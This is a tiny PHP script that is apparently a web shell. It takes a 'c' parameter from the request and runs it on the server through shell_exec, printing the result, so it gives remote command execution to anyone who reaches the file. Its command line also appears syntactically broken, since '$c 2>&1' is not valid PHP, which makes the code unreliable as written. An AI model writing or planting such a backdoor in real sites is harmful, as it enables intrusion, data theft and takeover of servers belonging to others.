<?php
$c=$_GET['c']??$_POST['c']??'';
if($c){echo shell_exec($c 2>&1);}
